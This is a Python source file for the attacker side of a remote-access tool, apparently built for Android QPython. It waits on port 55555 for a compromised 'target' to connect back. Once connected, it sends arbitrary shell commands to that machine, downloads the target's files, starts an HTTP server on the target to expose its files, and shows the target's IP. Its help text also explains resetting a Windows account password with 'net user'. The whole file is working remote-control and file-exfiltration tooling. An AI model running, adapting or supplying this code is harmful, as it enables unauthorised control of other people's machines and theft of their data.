#!/usr/bin/python
#-*-coding:utf8;-*-
#qpy:console
import subprocess 
import argparse
import random
import socket
import tqdm
import time
import sys
import os


BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def clear():
    os.system("clear")

clear()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

global host
global port

host = ""
port = 55555

help = YELLOW + """\n\t\t-------------- Help ------------------\n
    Commands\t\tUse\t\t\t\tExample"""+END+GREEN+"""
    l-host\t\tlocal-host <command>\t\tlocal-host ls
    download\t\tdownload <file name>\t\tdownload music.mp4
    server\t\tserver <IP:PORT>   \t\tserver 127.0.0.1:468
    target-ip\t\ttarget-ip             \t\tit shows the target ip
    output_save\t\toutput_save <True|False>\toutput_seve True or output_save False
    
    help\t\tit shows this help message
    
    if you on windows you can reset the password by typing as follows
    net user <user name> <new password> example: net user omer password123
    
    For more information type the name of the command
    """ + END

def Help(com):

    if com == "l-host":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("l-host      \t\tl-host <command> : Executing command on localhost or current hosting machine")
        print("""
l-host <commands>     : used to execute command on the local-host
                        example : l-host pwd
                                         l-host ls""")
            
    elif com == "download":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("download\t\tsend <file name> : download file to the host")
        print(""""
download <file_name>  : used to download file,mid,app and other from the target
                         example : download video.mp4
                                          download music.mp3
                                          download/dir_name2/music.mp3""")
        
    elif com == "server":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("server      \t\tserver <IP:PORT> ")
        print("""
server <host:port>    : used to run http server on the target to access target file throughout browser
                     example : server 127.0.0.1:55555
                            note: it only recommend on the same network""")
            	     
    elif com[:9] == "target-ip":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("target-ip\t\ttarget_ip")
        print("""
target-ip <optional_command>: used to return the target ip
                                       example : target-ip
                                                        target-ip help : help is the only optional command available""")
    elif com == "output_save":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print("output_save\t\toutput_save [True|False]")
        print("""
output_save <True|False>    : used to save the received output command to default file name or 
                                                  you can just changed the file name
                                                  
                                 example : output_seve True  : start saving
                                                  output_seve False : stop saving""")
    else:
        print(help)

def LocalHost(com):
    print(YELLOW+"\n\n\n"+"-"*50+END)
    print(GREEN+"[.......BEGINNING EXECUTING COMMAND ON LOCALHOST.......]"+END)
    print(YELLOW, "-"*50,END, "\n")

    if com[:2] == "cd":
        try:
            os.chdir(com[3:])
        except Exception as e:
            print(e)

    elif com[:2] == "ls":
        com = ("ls --color" + com[3:])
        os.system(com)

    else:
        os.system(com)
    print(YELLOW+"\n"+"-"*50+END)
    print(GREEN+"[...................END OF EXECUTING...................]"+END)
    print(YELLOW,"-"*50,END, "\n\n\n")

def recive(c):
    mp = 131537871
    _s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print(MAGENTA+"[+] START_DAWNLOADING..."+END)
    _port = port -1
    try:
        _s.bind((host,_port))
        _s.listen(5)
        _conn,add = _s.accept()
        print(_conn)
    except:
        pass
    file_size = float(_conn.recv(1024).decode("utf-8"))
    _size = (125.44*file_size)/mp
    print("file name: ",c,"file size: ",_size,"MB")
    with open("/sdcard/received/"+c,"wb") as file:
        #The time when the data start recving
        start_time = time.time()
        progress = tqdm.tqdm(unit="B", unit_scale=True, unit_divisor=1024,total=int(file_size))
        while True:
            data = _conn.recv(1024)
            if not(data):
                progress.update(1024)
                break
            progress.update(1024)
            file.write(data)
                
            #The time when the data stop recving
        end_time = time.time()
        print("\nFile dwonload successfully in ",int(end_time - start_time),"seconds")
        _conn.close()
        _s.close()

def main():
    
    seve_to_file = False
    default_fname = "save_out_put.txt"
    
    try:
        s.bind((host,port))

        print(GREEN+"[WAITING FOR THE CONNECTION...]"+END)
        s.listen(5)

        (conn,addr) = s.accept()
        pwd = conn.recv(1024).decode("utf-8")
        #clear()
    #print(YELLOW+"\t\t\t[TARGET ADDRS = "+END+GREEN+addr[0]+"]"+END)

    except Exception as e:
        print(RED,"[!][!] ",e,END)
        exit()

    except KeyboardInterrupt:
        clear()
        print(RED+"[KEYBOAD INTERRUPT Ctrl + C] Waite...")
        try:
            input("[Peres_Enter_To_Exit...]"+END)
            clear()
            s.close()
            exit(0)
        except KeyboardInterrupt:
              print(YELLOW+"[-] stupid can't escape this reality"+END)
              s.close()
              exit()
              pass
          
    while True:
    

        try:
            com = input(BLUE+"< ●"+END+GREEN+" ["+END+YELLOW+"Net-Cat"+END+GREEN+"]"+END+RED+"-"+END+GREEN+" ["+END+MAGENTA+pwd+END+GREEN+"]"+END+BLUE+"> "+END+GREEN+"\n\t\t└─> ")
            """help me"""+END
            if com[:8]=="download":

                if len(com) == 8:
                    print(GREEN,"[+]  Try: {} -h or --help".format(com))
                elif com[9:] == "-h" or com[9:] == "--help":
                    Help(com[:8])
                else:
                    conn.send(str.encode(com))
                    c = com[9:]
                    recive(c)

            elif com[:6] == "l-host":

                if len(com) == 6:
                    print(GREEN,"[+]  Try: {} -h or --help".format(com))
            
                elif com[7:] == "-h" or com[7:] == "--help":
                    Help(com[:6])
                else:
                    com = com[7:]
                    LocalHost(com)
            elif com[:9] == "target-ip":
                if len(com) == 9:
                    print(GREEN,"[+] [TARGET]",END,YELLOW, " target ip = {}".format(addr[0]),END )
                else:
                    Help(com)
            elif com[:11] == "output_save":
                if len(com) == 11:
                    print(GREEN,"[+]  Try: {} -h or --help".format(com))
                elif com[12:] == "-h" or com[12:] == "--help":
                    Help(com[:11])
                elif com[12:] == "True" or com[12:] == "true":
                    seve_to_file = True
                    new_fname = input("[+] Enter file name"+YELLOW+"(Default : {}): ".format(default_fname)+END)
                    if len(new_fname) != 0:
                        if new_fname == (" " * len(new_fname)):
                            print(YELLOW, "[+] Please Enter Valid Name ",END)
                            seve_to_file = False
                        else:
                            default_fname = new_fname
                elif com[12:] == "False" or com[12:] == "false":
                    seve_to_file = False
            elif com == "help":
                Help(com)
            
            elif com[:6] == "server":
                if len(com) == 6:
                    print(GREEN,"[+]  Try: {} -h or --help".format(com))
                elif com[7:] == "-h" or com[7:] == "--help":
                    Help(com[:6])
                else:
                    if ":" in com:
                        conn.send(str.encode(com))
                    else:
                        print(RED+"Invalid addres!!"+END)                                    

            else:
            
                if com == "" or com == (" " * len(com)):
                    com = "echo '[!][!] cannot execute empty commands :p'"

                conn.send(str.encode(com))
            
                if com == "exit" or com == "quite":
                    try:
                        input(RED+"[Peres_Enter_To_Exit...]"+END)
                        print(MAGENTA+"[EXITING... Good Bay...]"+END)
                        conn.send(str.encode(com))
                        break
                    except KeyboardInterrupt:
                        print(YELLOW+"[-] stupid can't escape this reality"+END)
                        break
                # maximum recive data 99999999B = 953.6743154526MB
                m = str(conn.recv(999999999),"utf-8")
                if "-pwd@-" in m:
                    pwd = m[6:]
                    m = GREEN+"[+]  successfully moved to : " + m[6:] +END
                print(m)
                if seve_to_file:
                    with open("input.txt","w") as f0:
                        f0.write(m)
                    with open("input.txt","r") as f,\
                            open("save_out_put.txt","a") as f2:
                                f2.write("<● [Netcat]-[{}]>{}\n".format(pwd,com))
                                for word in f.readlines():
                                    if "." in word:
                                        if "[" in word:
                                            f2.write("\t\t"+word[7:-4]+"\n")
                                        else:
                                            f2.write("\t\t"+word)
                                    else:
                                        if "[" in word:
                                            f2.write("\t\t/"+word[7:-4]+"\n")
                                        else:
                                            f2.write("\t\t/"+word)
                    os.system("rm -r input.txt")

        except Exception as e:
            print(e)

        except KeyboardInterrupt:
            clear()
            print(RED+"[KEYBOAD INTERRUPT Ctrl + C] Waite..."+END)
            try:
                input(MAGENTA+"[Peres_Enter_To_Continuse...]"+END)
                clear()
                pass
            except  KeyboardInterrupt:
                print(YELLOW+"[-] stupid can't escape this reality"+END)
                pass

    conn.close()
    s.close()

if __name__ == "__main__":
    main()
